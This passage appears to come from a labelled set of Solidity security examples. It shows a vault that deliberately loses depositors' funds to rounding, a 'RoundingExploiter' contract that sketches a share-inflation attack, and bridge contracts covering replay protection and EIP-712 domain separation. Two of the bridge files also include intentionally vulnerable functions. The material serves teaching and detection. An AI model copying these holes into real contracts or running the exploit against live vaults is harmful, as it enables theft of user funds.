     * @notice VULNERABLE: Allows deposits that round to 0 shares
     */
    function deposit(uint256 assets) public payable returns (uint256 shares) {
        require(msg.value == assets);

        if (totalShares == 0) {
            shares = assets;
        } else {
            shares = (assets * totalShares) / totalAssets;
        }

        if (shares == 0) {
            // ISSUE: Assets taken but no shares given!
            totalAssets += assets;
            emit DepositFailed(msg.sender, assets, "Shares rounded to 0");
            return 0;
        }

        totalAssets += assets;
        totalShares += shares;
        sharesOf[msg.sender] += shares;

        emit Deposit(msg.sender, assets, shares);
    }

    function withdraw(uint256 shares) public returns (uint256 assets) {
        require(sharesOf[msg.sender] >= shares);

        assets = (shares * totalAssets) / totalShares;

        sharesOf[msg.sender] -= shares;
        totalShares -= shares;
        totalAssets -= assets;

        payable(msg.sender).transfer(assets);

        emit Withdraw(msg.sender, assets, shares);
    }
}

/**
 * @title Rounding Exploit Contract
 * @notice Profits from rounding errors
 */
contract RoundingExploiter {
    VaultRoundingVulnerable public vault;

    constructor(address _vault) {
        vault = VaultRoundingVulnerable(_vault);
    }

    /**
     * @notice Exploit rounding by depositing then causing dust deposits
     * Assumes vault is new (totalShares = totalAssets)
     */
    function exploit() public payable {
        // Step 1: Deposit to get initial shares
        vault.deposit{value: 1 ether}(1 ether);
        // Now: 1 share = 1 ether

        // Step 2: Donate to inflate share price
        payable(address(vault)).transfer(1 ether);
        // Now: 1 share = 2 ether

        // Step 3: Cause many dust deposits (each gets 0 shares)
        // Users lose funds, vault totalAssets increases
        // Our share value increases!

        // Example: User deposits 1 wei
        // shares = (1 * 1) / 2000000000000000000 = 0
        // User's 1 wei added to vault, we profit
    }

    function withdraw() public {
        uint256 shares = vault.sharesOf(address(this));
        vault.withdraw(shares);
        // Withdraw inflated value
    }
}
```

---

## 🆕 NEW: CROSS-CHAIN / BRIDGE PATTERNS (65-67)

## FILE: public/baselines/solidity/bridge/65-message-verification.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Cross-Chain Message Verification
 * @notice BASELINE: Secure message verification for bridges
 * @dev SAFE: Proper signature + nonce + chainId verification
 *
 * METADATA:
 * - Category: bridge
 * - Tier: advanced
 * - Safe: true
 * - Tags: ["cross-chain", "bridge", "signature", "message-verification"]
 */
contract CrossChainMessageVerification {
    address public trustedRelayer;
    mapping(uint256 => bool) public processedMessages;
    mapping(address => uint256) public nonces;

    event MessageProcessed(uint256 indexed messageId, address indexed user, bytes data);
    event MessageRejected(uint256 indexed messageId, string reason);

    constructor(address _trustedRelayer) {
        trustedRelayer = _trustedRelayer;
    }

    /**
     * @notice Process cross-chain message with full verification
     * @dev SAFE: Checks signature, nonce, chainId, replay protection
     */
    function processMessage(
        uint256 messageId,
        address user,
        bytes memory data,
        uint256 nonce,
        uint256 sourceChainId,
        bytes memory signature
    ) public {
        // 1. Check message not already processed (replay protection)
        require(!processedMessages[messageId], "Message already processed");

        // 2. Verify nonce (prevents replay across different messages)
        require(nonce == nonces[user], "Invalid nonce");

        // 3. Reconstruct message hash with all critical data
        bytes32 messageHash = keccak256(abi.encodePacked(
            messageId,
            user,
            data,
            nonce,
            sourceChainId,
            block.chainid  // Destination chain ID
        ));

        // 4. Verify signature from trusted relayer
        bytes32 ethSignedMessageHash = keccak256(abi.encodePacked(
            "\x19Ethereum Signed Message:\n32",
            messageHash
        ));

        address signer = recoverSigner(ethSignedMessageHash, signature);
        require(signer == trustedRelayer, "Invalid signature");

        // 5. Mark as processed BEFORE execution (reentrancy protection)
        processedMessages[messageId] = true;
        nonces[user]++;

        // 6. Execute message
        // In production: decode and execute data

        emit MessageProcessed(messageId, user, data);
    }

    /**
     * @notice Recover signer from signature
     */
    function recoverSigner(bytes32 ethSignedMessageHash, bytes memory signature)
        internal
        pure
        returns (address)
    {
        require(signature.length == 65, "Invalid signature length");

        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }

        return ecrecover(ethSignedMessageHash, v, r, s);
    }

    /**
     * @notice VULNERABLE VERSION (for comparison)
     * @dev DO NOT USE - Missing critical checks
     */
    function processMessageVulnerable(
        uint256 messageId,
        bytes memory data
    ) public {
        // MISSING: Signature verification
        // MISSING: Nonce check
        // MISSING: Chain ID verification
        // MISSING: Replay protection

        // This allows:
        // 1. Anyone to submit messages (no auth)
        // 2. Same message to be replayed
        // 3. Messages from other chains to be replayed here

        emit MessageProcessed(messageId, msg.sender, data);
    }
}
```

---

## FILE: public/baselines/solidity/bridge/66-replay-protection.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Replay Protection for Bridges
 * @notice BASELINE: Multiple replay protection mechanisms
 * @dev SAFE: Nonce + messageId + chainId + deadline
 *
 * ATTACK VECTORS PREVENTED:
 * 1. Same-chain replay: Use messageId bitmap
 * 2. Cross-chain replay: Include both source & destination chainId
 * 3. Time-delayed replay: Use deadline
 * 4. Nonce reuse: Per-user nonce tracking
 *
 * METADATA:
 * - Category: bridge
 * - Tier: advanced
 * - Safe: true
 * - Tags: ["replay-protection", "bridge", "security"]
 */
contract ReplayProtection {
    // Bitmap for processed message IDs (gas-efficient)
    mapping(uint256 => uint256) private _processedMessageBitmap;

    // Per-user nonce for ordered messages
    mapping(address => uint256) public nonces;

    // Source chain ID → destination chain ID → valid
    mapping(uint256 => mapping(uint256 => bool)) public validChainPairs;

    address public trustedValidator;

    event MessageProcessed(
        uint256 indexed messageId,
        address indexed user,
        uint256 sourceChain,
        uint256 destinationChain
    );

    constructor(address _validator) {
        trustedValidator = _validator;

        // Setup valid chain pairs
        validChainPairs[1][137] = true;  // Ethereum → Polygon
        validChainPairs[137][1] = true;  // Polygon → Ethereum
    }

    /**
     * @notice Process message with comprehensive replay protection
     */
    function processMessage(
        uint256 messageId,
        address user,
        bytes memory data,
        uint256 nonce,
        uint256 sourceChainId,
        uint256 deadline,
        bytes memory signature
    ) public {
        // 1. REPLAY PROTECTION: Check message not processed
        require(!isMessageProcessed(messageId), "Message already processed");

        // 2. NONCE CHECK: Prevent out-of-order execution
        require(nonce == nonces[user], "Invalid nonce");

        // 3. CHAIN ID VERIFICATION: Prevent cross-chain replay
        require(validChainPairs[sourceChainId][block.chainid], "Invalid chain pair");
        require(sourceChainId != block.chainid, "Same chain not allowed");

        // 4. DEADLINE CHECK: Prevent time-delayed replay
        require(block.timestamp <= deadline, "Message expired");
        require(deadline <= block.timestamp + 1 hours, "Deadline too far");

        // 5. SIGNATURE VERIFICATION
        bytes32 messageHash = keccak256(abi.encodePacked(
            messageId,
            user,
            data,
            nonce,
            sourceChainId,
            block.chainid,
            deadline
        ));

        bytes32 ethSignedHash = keccak256(abi.encodePacked(
            "\x19Ethereum Signed Message:\n32",
            messageHash
        ));

        require(recoverSigner(ethSignedHash, signature) == trustedValidator, "Invalid signature");

        // 6. MARK AS PROCESSED (before execution)
        _setMessageProcessed(messageId);
        nonces[user]++;

        // 7. Execute message
        // ... execution logic ...

        emit MessageProcessed(messageId, user, sourceChainId, block.chainid);
    }

    /**
     * @notice Check if message was processed (bitmap method - gas efficient)
     */
    function isMessageProcessed(uint256 messageId) public view returns (bool) {
        uint256 bucket = messageId / 256;
        uint256 position = messageId % 256;
        uint256 mask = 1 << position;

        return (_processedMessageBitmap[bucket] & mask) != 0;
    }

    /**
     * @notice Mark message as processed
     */
    function _setMessageProcessed(uint256 messageId) private {
        uint256 bucket = messageId / 256;
        uint256 position = messageId % 256;
        uint256 mask = 1 << position;

        _processedMessageBitmap[bucket] |= mask;
    }

    function recoverSigner(bytes32 ethSignedMessageHash, bytes memory signature)
        internal
        pure
        returns (address)
    {
        require(signature.length == 65);

        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }

        return ecrecover(ethSignedMessageHash, v, r, s);
    }
}
```

---

## FILE: public/baselines/solidity/bridge/67-domain-separation.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Domain Separation for Bridges
 * @notice BASELINE: EIP-712 domain separation for cross-chain messages
 * @dev SAFE: Proper domain separator prevents signature reuse
 *
 * PREVENTS:
 * 1. Signature replay across different contracts
 * 2. Signature replay across different chains
 * 3. Signature replay in different versions
 *
 * METADATA:
 * - Category: bridge
 * - Tier: advanced
 * - Safe: true
 * - Standard: EIP-712
 * - Tags: ["domain-separation", "eip712", "bridge"]
 */
contract DomainSeparation {
    // EIP-712 Domain Separator
    bytes32 public DOMAIN_SEPARATOR;

    // Type hashes for different message types
    bytes32 public constant BRIDGE_MESSAGE_TYPEHASH = keccak256(
        "BridgeMessage(uint256 messageId,address user,bytes data,uint256 nonce,uint256 sourceChain,uint256 deadline)"
    );

    mapping(uint256 => bool) public processedMessages;
    mapping(address => uint256) public nonces;

    address public trustedRelayer;

    event MessageProcessed(uint256 indexed messageId, address indexed user);

    constructor(address _relayer, string memory version) {
        trustedRelayer = _relayer;

        // Build EIP-712 domain separator
        DOMAIN_SEPARATOR = keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256(bytes("CrossChainBridge")),
            keccak256(bytes(version)),
            block.chainid,
            address(this)
        ));
    }

    /**
     * @notice Process message with EIP-712 domain separation
     * @dev SAFE: Signature cannot be reused across contracts/chains/versions
     */
    function processMessage(
        uint256 messageId,
        address user,
        bytes memory data,
        uint256 nonce,
        uint256 sourceChain,
        uint256 deadline,
        bytes memory signature
    ) public {
        require(!processedMessages[messageId], "Already processed");
        require(nonce == nonces[user], "Invalid nonce");
        require(block.timestamp <= deadline, "Expired");

        // 1. Build structured data hash (EIP-712)
        bytes32 structHash = keccak256(abi.encode(
            BRIDGE_MESSAGE_TYPEHASH,
            messageId,
            user,
            keccak256(data),
            nonce,
            sourceChain,
            deadline
        ));

        // 2. Combine with domain separator
        bytes32 digest = keccak256(abi.encodePacked(
            "\x19\x01",  // EIP-712 prefix
            DOMAIN_SEPARATOR,
            structHash
        ));

        // 3. Verify signature
        address signer = recoverSigner(digest, signature);
        require(signer == trustedRelayer, "Invalid signature");

        // 4. Process
        processedMessages[messageId] = true;
        nonces[user]++;

        emit MessageProcessed(messageId, user);
    }

    /**
     * @notice VULNERABLE VERSION (no domain separation)
     * @dev Signature can be replayed across contracts/chains
     */
    function processMessageVulnerable(
        uint256 messageId,
        bytes memory data,
        bytes memory signature
    ) public {
        // VULNERABLE: No domain separator
        // Same signature can be used on:
        // - Different contract addresses
        // - Different chains
        // - Different versions

        bytes32 messageHash = keccak256(abi.encodePacked(messageId, data));

        bytes32 ethSignedHash = keccak256(abi.encodePacked(
            "\x19Ethereum Signed Message:\n32",
            messageHash
        ));

        address signer = recoverSigner(ethSignedHash, signature);
        require(signer == trustedRelayer, "Invalid signature");

        // Vulnerable to replay!
    }

    function recoverSigner(bytes32 hash, bytes memory signature)
        internal
        pure
        returns (address)
    {
        require(signature.length == 65);

        bytes32 r;
        bytes32 s;
        uint8 v;

        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }

        return ecrecover(hash, v, r, s);
    }

    /**
     * @notice Get domain separator for off-chain signing
     */
    function getDomainSeparator() public view returns (bytes32) {
        return DOMAIN_SEPARATOR;
    }

    /**
     * @notice Helper for off-chain: get message hash for signing
     */
    function getMessageHash(
        uint256 messageId,
        address user,
        bytes memory data,
        uint256 nonce,
        uint256 sourceChain,
        uint256 deadline
    ) public view returns (bytes32) {
        bytes32 structHash = keccak256(abi.encode(
            BRIDGE_MESSAGE_TYPEHASH,
            messageId,
            user,
            keccak256(data),
            nonce,
            sourceChain,
            deadline
        ));

        return keccak256(abi.encodePacked(
            "\x19\x01",
            DOMAIN_SEPARATOR,
            structHash
        ));
    }
}
```
